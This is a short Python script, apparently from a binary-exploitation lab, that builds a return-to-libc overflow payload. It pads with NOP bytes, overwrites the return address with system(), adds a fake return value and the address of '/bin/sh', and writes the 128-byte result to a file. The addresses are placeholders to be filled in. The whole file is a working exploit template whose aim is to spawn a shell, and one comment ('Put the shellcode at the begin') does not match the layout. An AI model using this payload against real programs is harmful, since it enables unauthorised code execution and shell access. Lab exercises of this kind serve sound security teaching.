#!/usr/bin/python
# -*- coding: utf-8 -*-
# attack_input3.py
import sys
import struct

offset = 0xff # modify it
system_addr = 0xffffffff # modify it
binsh_addr =  0xffffffff # modify it
ret = 0xdeadbeef
## Put the shellcode at the begin
buf = (offset-4)*'\x90' + 2* struct.pack('<I', system_addr) + struct.pack('<I', ret) + struct.pack('<I', binsh_addr)
buf += (128 - len(buf)) * 'a'
file = open('attack_input3', 'wb')
file.write(buf)
file.close()
